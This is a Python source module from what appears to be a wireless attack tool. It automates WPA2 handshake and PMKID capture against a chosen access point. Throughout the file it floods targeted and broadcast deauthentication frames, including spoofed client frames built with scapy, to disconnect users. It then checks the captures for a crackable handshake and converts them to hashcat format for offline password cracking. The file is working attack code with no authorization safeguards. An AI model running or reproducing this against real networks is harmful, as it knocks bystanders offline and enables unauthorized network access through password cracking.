"""
modules/handshake.py

WPA2 handshake capture — single airodump-ng instance, real-time CSV parsing,
bidirectional deauth, triple verification.
"""
from __future__ import annotations

import csv
import glob
import hashlib
import os
import re
import shutil
import signal
import subprocess
import tempfile
import threading
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import List, Optional, Set


# ═══════════════════════════════════════════════════════════
# DATA CLASS
# ═══════════════════════════════════════════════════════════

@dataclass
class WifiClient:
    mac: str
    power: int        # dBm — more negative = weaker (e.g. -55 is stronger than -80)
    packets: int

    @property
    def signal_label(self) -> str:
        if self.power >= -50:   return f"{self.power} dBm [excellent]"
        elif self.power >= -65: return f"{self.power} dBm [good]"
        elif self.power >= -75: return f"{self.power} dBm [fair]"
        else:                   return f"{self.power} dBm [weak]"


# ═══════════════════════════════════════════════════════════
# FILE FINDERS
# ═══════════════════════════════════════════════════════════

def _find_cap_file(prefix: str) -> Optional[str]:
    """
    airodump-ng writes PREFIX-01.cap (never PREFIX.cap).
    Returns the most recently modified .cap file matching the prefix.
    """
    matches = glob.glob(prefix + '-*.cap')
    if not matches:
        return None
    return max(matches, key=os.path.getmtime)


def _find_csv_file(prefix: str) -> Optional[str]:
    """Return the airodump-ng CSV output file (PREFIX-01.csv)."""
    matches = glob.glob(prefix + '-*.csv')
    if not matches:
        return None
    return max(matches, key=os.path.getmtime)


# ═══════════════════════════════════════════════════════════
# CSV PARSER
# ═══════════════════════════════════════════════════════════

def _parse_clients_from_csv(csv_path: str, target_bssid: str) -> List[WifiClient]:
    """
    Parse airodump-ng CSV to find clients associated with target_bssid.

    airodump-ng CSV has two sections separated by a blank line:
      Section 1: AP list (starts with "BSSID," header)
      Section 2: Station list (starts with "Station MAC," header)

    Station section column layout (0-indexed):
      0: Station MAC
      1: First time seen
      2: Last time seen
      3: Power (dBm, often negative)
      4: # packets
      5: BSSID (the AP this client is associated with)
      6+: Probed ESSIDs

    Critical fixes applied:
    - Strip null bytes (\\0) before parsing — airodump-ng bug on some versions
    - Set hit_clients flag BEFORE skipping the header row (fixes dropped first client)
    - Strip ALL field values before comparison (fixes whitespace BSSID mismatch)
    - Filter (not associated) entries
    - Handle power=0 and power=-1 (unknown) gracefully
    """
    if not csv_path or not os.path.exists(csv_path):
        return []

    clients: List[WifiClient] = []
    seen_macs: Set[str] = set()
    hit_clients = False
    target_upper = target_bssid.strip().upper()

    try:
        with open(csv_path, 'r', errors='replace') as f:
            # Strip null bytes per line before feeding to csv.reader
            lines = [line.replace('\0', '') for line in f]

        reader = csv.reader(lines)
        for row in reader:
            if not row:
                continue

            # Detect section boundary — set flag BEFORE skipping this header row
            first_cell = row[0].strip()
            if first_cell == 'Station MAC':
                hit_clients = True
                continue   # skip the header row itself

            # Skip AP section header and blank lines
            if first_cell in ('BSSID', '') or not first_cell:
                continue

            if not hit_clients:
                continue   # still in AP section

            # ── We are in the Station section ──
            if len(row) < 6:
                continue

            station_mac = row[0].strip().upper()
            assoc_bssid = row[5].strip().upper()

            # Skip unassociated clients
            if assoc_bssid in ('(NOT ASSOCIATED)', '', 'BSSID'):
                continue

            # Filter to our target AP only
            if assoc_bssid != target_upper:
                continue

            # Validate MAC format (17 chars: XX:XX:XX:XX:XX:XX)
            if len(station_mac) != 17 or station_mac.count(':') != 5:
                continue

            # Deduplicate
            if station_mac in seen_macs:
                continue
            seen_macs.add(station_mac)

            # Parse power — treat 0 and -1 as unknown (-100 for sorting purposes)
            try:
                power = int(row[3].strip())
                if power in (0, -1):
                    power = -100
            except ValueError:
                power = -100

            try:
                packets = int(row[4].strip())
            except ValueError:
                packets = 0

            clients.append(WifiClient(
                mac=station_mac,
                power=power,
                packets=packets,
            ))

    except Exception:
        pass  # Return whatever we have — never crash

    # Sort by signal strength (higher dBm = closer to 0 = stronger)
    clients.sort(key=lambda c: c.power, reverse=True)
    return clients


# Backward-compat alias for tests that import from old client_scanner
_parse_airodump_csv = _parse_clients_from_csv


# ═══════════════════════════════════════════════════════════
# CHANNEL LOCK (Bug 11 fix)
# ═══════════════════════════════════════════════════════════

def _lock_channel(channel: int, monitor_interface: str) -> bool:
    """
    Lock interface to channel. Try three times with readback verification.
    Returns True if lock confirmed, False if unconfirmed (proceed with warning).
    """
    for attempt in range(3):
        subprocess.run(
            ['iw', 'dev', monitor_interface, 'set', 'channel', str(channel)],
            capture_output=True, timeout=5
        )
        subprocess.run(
            ['iwconfig', monitor_interface, 'channel', str(channel)],
            capture_output=True, timeout=5
        )
        time.sleep(0.4)

        # Verify: read back the current channel
        try:
            result = subprocess.run(
                ['iw', 'dev', monitor_interface, 'info'],
                capture_output=True, text=True, timeout=5
            )
            m = re.search(r'channel\s+(\d+)', result.stdout)
            if m and int(m.group(1)) == channel:
                return True
        except Exception:
            pass
        time.sleep(0.5)

    return False


# Backward-compat alias used by tests
lock_channel_verified = _lock_channel


# ═══════════════════════════════════════════════════════════
# INJECTION CAPABILITY TEST
# ═══════════════════════════════════════════════════════════

def verify_injection_capability(monitor_interface: str) -> bool:
    """
    Test packet injection with aireplay-ng -9.
    Returns True if injection confirmed. NEVER aborts capture — warning only.
    """
    try:
        result = subprocess.run(
            ['aireplay-ng', '-9', monitor_interface],
            capture_output=True, text=True, timeout=15
        )
        output = result.stdout + result.stderr
        if 'injection is working' in output.lower():
            return True
        if 'successful' in output.lower():
            return True
    except (subprocess.TimeoutExpired, FileNotFoundError):
        pass
    return False


# ═══════════════════════════════════════════════════════════
# HANDSHAKE VERIFICATION — triple method (Bug 10 fix)
# ═══════════════════════════════════════════════════════════

def verify_handshake(cap_file: str, bssid: str, ssid: str = '') -> bool:
    """
    Check if cap_file contains a crackable WPA2 handshake for bssid.

    Method 1: aircrack-ng with single impossible-password wordlist.
      Avoids /dev/null edge cases in some aircrack versions.
      Output "WPA (N handshake)" with N>0 means crackable handshake found.

    Method 2: tshark EAPOL message-type check.
      Identifies M1+M2 or M2+M3 pairs using Key Information bits.

    Method 3: scapy rdpcap fallback.
      Same M1+M2 logic via raw byte parsing.
    """
    if not cap_file or not os.path.exists(cap_file):
        return False
    try:
        if os.path.getsize(cap_file) < 200:
            return False
    except OSError:
        return False

    # ── Method 1: aircrack-ng ──────────────────────────────────────────
    _verify_wl = '/tmp/_wd_verify_wl.txt'
    try:
        with open(_verify_wl, 'w') as f:
            f.write('wifi_down_verify_impossible_xyzzy\n')
    except OSError:
        _verify_wl = '/dev/null'

    try:
        result = subprocess.run(
            ['aircrack-ng', '-a', '2', '-b', bssid.upper(),
             '-w', _verify_wl, cap_file],
            capture_output=True, text=True, timeout=25
        )
        combined = result.stdout + result.stderr

        # Match "WPA (1 handshake)" or "WPA (2 handshake" etc.
        m = re.search(r'WPA\s*\((\d+)\s+handshake', combined, re.IGNORECASE)
        if m and int(m.group(1)) > 0:
            return True

        # Some aircrack versions print "1 handshake found"
        m2 = re.search(r'(\d+)\s+handshake', combined, re.IGNORECASE)
        if m2 and int(m2.group(1)) > 0:
            return True

        if 'no valid wpa handshake' in combined.lower():
            return False
        if '0 handshake' in combined.lower():
            return False

    except (subprocess.TimeoutExpired, FileNotFoundError):
        pass  # Fall through to Method 2

    # ── Method 2: tshark Key Info analysis ────────────────────────────
    try:
        result = subprocess.run(
            ['tshark', '-r', cap_file,
             '-Y', f'eapol && wlan.bssid == {bssid.lower()}',
             '-T', 'fields', '-e', 'eapol.keydes.key_info'],
            capture_output=True, text=True, timeout=15
        )
        msgs: Set[int] = set()
        for line in result.stdout.splitlines():
            line = line.strip()
            if not line:
                continue
            try:
                ki = int(line, 16)
            except ValueError:
                try:
                    ki = int(line)
                except ValueError:
                    continue
            ack  = bool(ki & 0x0080)
            mic  = bool(ki & 0x0100)
            inst = bool(ki & 0x0040)
            sec  = bool(ki & 0x0200)

            if ack and not mic:                              msgs.add(1)  # M1
            elif not ack and mic and not inst and not sec:   msgs.add(2)  # M2
            elif ack and mic:                                msgs.add(3)  # M3
            elif not ack and mic and sec:                    msgs.add(4)  # M4

        if {1, 2}.issubset(msgs) or {2, 3}.issubset(msgs):
            return True
    except (subprocess.TimeoutExpired, FileNotFoundError):
        pass

    # ── Method 3: scapy rdpcap fallback ───────────────────────────────
    try:
        from scapy.all import rdpcap, EAPOL, Dot11  # type: ignore
        pkts = rdpcap(cap_file)
        bssid_up = bssid.upper()
        msgs2: Set[int] = set()
        for p in pkts:
            if not p.haslayer(EAPOL):
                continue
            if p.haslayer(Dot11):
                if (p[Dot11].addr3 or '').upper() != bssid_up:
                    continue
            try:
                raw = bytes(p[EAPOL])
                # raw[0]=version, raw[1]=type (3=EAPOL-Key), raw[2-3]=length
                if len(raw) < 7 or raw[1] != 3:
                    continue
                ki = (raw[5] << 8) | raw[6]
                ack  = bool(ki & 0x0080)
                mic  = bool(ki & 0x0100)
                inst = bool(ki & 0x0040)
                sec  = bool(ki & 0x0200)
                if ack and not mic:                              msgs2.add(1)
                elif not ack and mic and not inst and not sec:   msgs2.add(2)
                elif ack and mic:                                msgs2.add(3)
                elif not ack and mic and sec:                    msgs2.add(4)
            except Exception:
                continue
        if {1, 2}.issubset(msgs2) or {2, 3}.issubset(msgs2):
            return True
    except Exception:
        pass

    return False


# ═══════════════════════════════════════════════════════════
# DEAUTH — targeted and broadcast (Surviving Bug 2 fix)
# ═══════════════════════════════════════════════════════════

def _deauth_targeted(bssid: str, client_mac: str, iface: str, count: int = 64):
    """
    Send targeted deauth frames.

    Direction 1 (AP→Client): aireplay-ng with -D and high injection rate.
      -D disables internal channel locking in aireplay, preventing conflict
      with the running airodump-ng.  (Surviving Bug 2 fix)
      -x 1000 = 1000 packets/sec = burst completes in count/1000 seconds
      --ignore-negative-one = skip channel -1 errors

    Direction 2 (Client→AP): scapy raw frames.
      Forces AP to drop the association entry, making full 4-way handshake
      mandatory on reconnect regardless of PMF state on the client side.
    """
    # Direction 1: aireplay-ng (AP→Client)
    try:
        subprocess.Popen(
            ['aireplay-ng',
             '-0', str(count),
             '-a', bssid.upper(),
             '-c', client_mac.upper(),
             '-D',                       # Surviving Bug 2 fix: disable aireplay channel mgmt
             '-x', '1000',               # fast burst
             '--ignore-negative-one',
             iface],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
    except FileNotFoundError:
        pass

    # Direction 2: scapy (Client→AP)
    try:
        from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp  # type: ignore
        frame = (
            RadioTap() /
            Dot11(
                addr1=bssid.upper(),       # To: AP
                addr2=client_mac.upper(),  # From: Client (spoofed)
                addr3=bssid.upper(),       # BSSID
            ) /
            Dot11Deauth(reason=7)
        )
        sendp(frame, iface=iface, count=count // 2, inter=0.05, verbose=False)
    except Exception:
        pass


def _deauth_broadcast(bssid: str, iface: str, count: int = 128):
    """Broadcast deauth when no specific clients are known."""
    try:
        subprocess.Popen(
            ['aireplay-ng',
             '-0', str(count),
             '-a', bssid.upper(),
             '-D',
             '-x', '1000',
             '--ignore-negative-one',
             iface],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
    except FileNotFoundError:
        pass

    # Scapy broadcast deauth as fallback
    try:
        from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp  # type: ignore
        frame = (
            RadioTap() /
            Dot11(
                addr1='ff:ff:ff:ff:ff:ff',  # Broadcast
                addr2=bssid.upper(),
                addr3=bssid.upper(),
            ) /
            Dot11Deauth(reason=7)
        )
        sendp(frame, iface=iface, count=count // 2, inter=0.04, verbose=False)
    except Exception:
        pass


# ═══════════════════════════════════════════════════════════
# SCAPY SNIFFER THREAD (Surviving Bug 1 fix)
# ═══════════════════════════════════════════════════════════

def _scapy_sniffer_thread(
    bssid: str,
    iface: str,
    result: dict,       # mutable: set result['cap_file'] on success
    stop_ev: threading.Event,
    tmpdir: str,
) -> None:
    """
    Engine B: scapy EAPOL sniffer. Runs in a daemon thread.

    Surviving Bug 1 fix:
      Uses AsyncSniffer (not sniff() with stop_filter).
      AsyncSniffer.stop() can be called from any thread and takes effect
      immediately — it does not wait for the next packet to arrive.

    lfilter instead of BPF:
      BPF 'ether proto 0x888e' is unreliable in monitor mode across drivers.
      lfilter=lambda p: p.haslayer(EAPOL) works on all drivers.
    """
    try:
        from scapy.all import AsyncSniffer, EAPOL, Dot11, wrpcap  # type: ignore
    except ImportError:
        return

    bssid_up = bssid.upper()
    frames = []
    msgs: Set[int] = set()

    def _handler(pkt):
        if not pkt.haslayer(EAPOL):
            return
        # Verify this packet is from/to our target AP (addr3 = BSSID in 802.11)
        if pkt.haslayer(Dot11):
            if (pkt[Dot11].addr3 or '').upper() != bssid_up:
                return
        frames.append(pkt)

        # Identify message type
        try:
            raw = bytes(pkt[EAPOL])
            # raw[0]=version, raw[1]=type (3=EAPOL-Key), raw[2-3]=length
            if len(raw) >= 7 and raw[1] == 3:
                ki = (raw[5] << 8) | raw[6]
                ack  = bool(ki & 0x0080)
                mic  = bool(ki & 0x0100)
                inst = bool(ki & 0x0040)
                sec  = bool(ki & 0x0200)
                if ack and not mic:
                    msgs.add(1)
                elif not ack and mic and not inst and not sec:
                    msgs.add(2)
                elif ack and mic:
                    msgs.add(3)
                elif not ack and mic and sec:
                    msgs.add(4)
        except Exception:
            pass

        # Check for crackable pair
        if {1, 2}.issubset(msgs) or {2, 3}.issubset(msgs):
            cap_path = os.path.join(tmpdir, 'scapy_handshake.cap')
            try:
                wrpcap(cap_path, frames)
                result['cap_file'] = cap_path
            except Exception:
                pass
            stop_ev.set()

    # Use AsyncSniffer — stop() is immediate, not waiting for next packet
    sniffer = AsyncSniffer(
        iface=iface,
        lfilter=lambda p: p.haslayer(EAPOL),
        prn=_handler,
        store=False,
    )
    sniffer.start()

    # Wait for stop_event; poll every 0.5s to keep responsiveness
    while not stop_ev.is_set():
        time.sleep(0.5)

    # Stop immediately — this is the Surviving Bug 1 fix
    try:
        sniffer.stop(join=True)
    except Exception:
        pass


# ═══════════════════════════════════════════════════════════
# PMKID PHASE (Surviving Bug 3 fix)
# ═══════════════════════════════════════════════════════════

def _run_pmkid_phase(
    bssid: str,
    iface: str,
    tmpdir: str,
    duration: int = 90,
) -> Optional[str]:
    """
    Phase 3: hcxdumptool PMKID capture.
    Called AFTER airodump-ng has been terminated (Bug 9).

    Surviving Bug 3 fix:
    hcxdumptool --filterlist_ap expects BSSIDs WITHOUT colons.
    Writing 'aa:bb:cc:11:22:33' causes it to capture all traffic.
    Must write 'aabbcc112233' (no colons, lowercase).
    """
    pcapng = os.path.join(tmpdir, 'pmkid.pcapng')
    hc22k  = os.path.join(tmpdir, 'pmkid.hc22000')

    # Surviving Bug 3 fix: remove colons from BSSID for filter file
    bssid_no_colons = bssid.lower().replace(':', '')
    filter_file = os.path.join(tmpdir, 'bssid_filter.txt')
    with open(filter_file, 'w') as f:
        f.write(bssid_no_colons + '\n')

    cmd = [
        'hcxdumptool',
        '-i', iface,
        '-o', pcapng,
        '--enable_status=1',
        f'--filterlist_ap={filter_file}',
        '--filtermode=2',
        '--disable_deauthentication',
    ]
    proc = None
    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        deadline = time.time() + duration
        while time.time() < deadline:
            time.sleep(10)
            if os.path.exists(pcapng) and os.path.getsize(pcapng) > 100:
                break
    except FileNotFoundError:
        print("  [!] hcxdumptool not installed — skipping PMKID phase")
        return None
    finally:
        if proc and proc.poll() is None:
            proc.terminate()
            try: proc.wait(timeout=3)
            except subprocess.TimeoutExpired: proc.kill()

    if not os.path.exists(pcapng) or os.path.getsize(pcapng) < 100:
        return None

    # Convert pcapng → hc22000
    for tool in ['hcxpcapngtool', 'hcxpcaptool']:  # try both names
        try:
            subprocess.run(
                [tool, '-o', hc22k, pcapng],
                capture_output=True, timeout=30
            )
            if os.path.exists(hc22k) and os.path.getsize(hc22k) > 0:
                return hc22k
        except (FileNotFoundError, subprocess.TimeoutExpired):
            continue
    return None


# ═══════════════════════════════════════════════════════════
# FINALIZE
# ═══════════════════════════════════════════════════════════

def _finalize(cap_file: str, bssid: str, tmpdir: str) -> str:
    """
    Copy cap/hc22000 to captures/, print SHA-256, auto-convert to hc22000.
    Returns the final saved path.
    """
    os.makedirs('captures', exist_ok=True)

    safe_bssid = bssid.replace(':', '')
    ts = int(time.time())
    ext = '.hc22000' if cap_file.endswith('.hc22000') else '.cap'
    final = os.path.join('captures', f'handshake_{safe_bssid}_{ts}{ext}')
    shutil.copy2(cap_file, final)

    # SHA-256 for evidence
    sha = hashlib.sha256(Path(final).read_bytes()).hexdigest()
    print(f"  [+] Saved : {final}")
    print(f"      SHA256: {sha}")

    # Auto-convert .cap → .hc22000 for hashcat
    if ext == '.cap':
        hc22k = final.replace('.cap', '.hc22000')
        for tool in ['hcxpcapngtool', 'hcxpcaptool']:
            try:
                subprocess.run(
                    [tool, '-o', hc22k, final],
                    capture_output=True, timeout=30
                )
                if os.path.exists(hc22k) and os.path.getsize(hc22k) > 0:
                    print(f"      hashcat : {hc22k}")
                    break
            except (FileNotFoundError, subprocess.TimeoutExpired):
                continue

    return final


# ═══════════════════════════════════════════════════════════
# MASTER CAPTURE FUNCTION
# ═══════════════════════════════════════════════════════════

def capture_handshake(
    bssid: str,
    ssid: str,
    channel: int,
    monitor_interface: str,
    timeout: int = 180,
) -> Optional[str]:
    """
    Capture WPA2 handshake. Returns path to .cap or .hc22000 file on success.

    Architecture:
    - ONE airodump-ng instance writes BOTH -01.csv AND -01.cap simultaneously
    - Client discovery reads the CSV while capture is already in progress
    - No gap between discovery and capture
    - Verified channel lock before any capture starts
    - Triple-verified handshake (aircrack-ng, tshark, scapy)
    """
    print(f"\n  [*] Target : {ssid} ({bssid})")
    print(f"  [*] Channel: {channel}")

    tmpdir = tempfile.mkdtemp(prefix='wd_hs_')
    cap_prefix   = os.path.join(tmpdir, 'capture')
    airodump_proc = None
    stop_ev       = threading.Event()
    scapy_result  = {}

    try:
        # ── Stage 1: Lock channel ────────────────────────────────────────────
        print(f"  [*] Locking channel {channel}...")
        ok = _lock_channel(channel, monitor_interface)
        print(f"  {'[+]' if ok else '[!]'} Channel {'confirmed' if ok else 'lock unconfirmed — proceeding'}")

        # ── Stage 2: Launch ONE airodump-ng (BOTH csv AND cap output) ────────
        # KEY FIX: No --output-format flag → airodump writes BOTH -01.cap AND -01.csv
        # This eliminates the architectural split between discovery and capture.
        print("  [*] Starting capture (airodump-ng)...")
        airodump_cmd = [
            'airodump-ng',
            '--bssid', bssid.upper(),
            '-c', str(channel),
            '--write-interval', '1',    # flush to disk every second
            '-w', cap_prefix,           # NO --output-format = writes cap + csv + netxml
            monitor_interface,
        ]
        airodump_proc = subprocess.Popen(
            airodump_cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        # Wait for cap file to appear (up to 5s) before starting deauth
        cap_file = None
        for _ in range(50):
            time.sleep(0.1)
            cap_file = _find_cap_file(cap_prefix)
            if cap_file:
                break
        print(f"  [+] Capture file: {cap_file or '(waiting...)'}")

        # ── Stage 3: Start scapy sniffer in background ───────────────────────
        scapy_th = threading.Thread(
            target=_scapy_sniffer_thread,
            args=(bssid, monitor_interface, scapy_result, stop_ev, tmpdir),
            daemon=True,
        )
        scapy_th.start()

        # ── Stage 4: Discover clients from CSV while capture runs ────────────
        # Read CSV while airodump is still running — no gap, no kill-restart
        print("  [*] Discovering clients (reading live CSV for 15 s)...")
        clients: List[WifiClient] = []
        all_seen_macs: Set[str] = set()
        csv_deadline = time.time() + 15

        while time.time() < csv_deadline:
            time.sleep(2)
            csv_path = _find_csv_file(cap_prefix)
            if csv_path:
                fresh = _parse_clients_from_csv(csv_path, bssid)
                for c in fresh:
                    if c.mac not in all_seen_macs:
                        all_seen_macs.add(c.mac)
                        clients.append(c)
                        print(f"      + Client: {c.mac}  {c.signal_label}")

            # Also check for early handshake (sometimes passive capture is enough)
            if not stop_ev.is_set():
                cap_file = _find_cap_file(cap_prefix)
                if cap_file and verify_handshake(cap_file, bssid, ssid):
                    print("  [+] Handshake captured passively!")
                    stop_ev.set()
                    return _finalize(cap_file, bssid, tmpdir)

        # Sort by signal strength
        clients.sort(key=lambda c: c.power, reverse=True)
        target_clients = clients[:3]  # top 3 by signal

        if clients:
            print(f"  [+] {len(clients)} client(s) found. Targeting top {len(target_clients)}.")
        else:
            print("  [!] No clients found — using broadcast deauth.")

        # ── Stage 5: Deauth loop ─────────────────────────────────────────────
        # Surviving Bug 4 fix: verify at most every 3 seconds
        # Surviving Bug 5 fix: 64 frames per client, 12s wait window
        max_rounds = max(6, (timeout - 15 - 90) // 20)  # leave time for PMKID phase
        last_verify_time = 0.0
        VERIFY_INTERVAL = 3.0   # seconds between verification calls

        print(f"  [*] Starting deauth ({max_rounds} rounds)...")
        for rnd in range(1, max_rounds + 1):
            if stop_ev.is_set():
                break

            print(f"  [*] Round {rnd}/{max_rounds}", end='', flush=True)

            if target_clients:
                for client in target_clients:
                    if stop_ev.is_set():
                        break
                    print(f"  → {client.mac}", end='', flush=True)
                    _deauth_targeted(bssid, client.mac, monitor_interface, count=64)
            else:
                _deauth_broadcast(bssid, monitor_interface, count=128)
            print()  # newline

            # Wait window: 12 seconds, checking every 3 seconds
            for _ in range(4):   # 4 × 3s = 12s
                time.sleep(3)
                if stop_ev.is_set():
                    break

                now = time.time()
                if now - last_verify_time >= VERIFY_INTERVAL:
                    last_verify_time = now
                    cap_file = _find_cap_file(cap_prefix)
                    if cap_file and verify_handshake(cap_file, bssid, ssid):
                        print("  [+] Handshake captured!")
                        stop_ev.set()
                        return _finalize(cap_file, bssid, tmpdir)

                # Also check scapy result
                if scapy_result.get('cap_file'):
                    sc = scapy_result['cap_file']
                    if verify_handshake(sc, bssid, ssid):
                        print("  [+] Handshake captured (scapy engine)!")
                        stop_ev.set()
                        return _finalize(sc, bssid, tmpdir)

            # Refresh client list from CSV between rounds
            csv_path = _find_csv_file(cap_prefix)
            if csv_path:
                fresh = _parse_clients_from_csv(csv_path, bssid)
                for c in fresh:
                    if c.mac not in all_seen_macs:
                        all_seen_macs.add(c.mac)
                        clients.append(c)
                        target_clients = sorted(clients, key=lambda x: x.power, reverse=True)[:3]
                        print(f"      + New client: {c.mac} {c.signal_label}")

        # ── Stage 6: PMKID phase ─────────────────────────────────────────────
        if not stop_ev.is_set():
            print("  [*] Phase 3: PMKID capture (90 s)...")

            # Kill airodump to release interface for hcxdumptool (Bug 9)
            if airodump_proc and airodump_proc.poll() is None:
                airodump_proc.terminate()
                try: airodump_proc.wait(timeout=3)
                except subprocess.TimeoutExpired: airodump_proc.kill()
                airodump_proc = None
            time.sleep(1.0)

            hc22k = _run_pmkid_phase(bssid, monitor_interface, tmpdir, duration=90)
            if hc22k:
                print(f"  [+] PMKID captured: {hc22k}")
                stop_ev.set()
                return _finalize(hc22k, bssid, tmpdir)

        print("  [-] No handshake captured.")
        return None

    finally:
        stop_ev.set()
        if airodump_proc and airodump_proc.poll() is None:
            airodump_proc.terminate()
            try: airodump_proc.wait(timeout=3)
            except subprocess.TimeoutExpired: airodump_proc.kill()
        shutil.rmtree(tmpdir, ignore_errors=True)
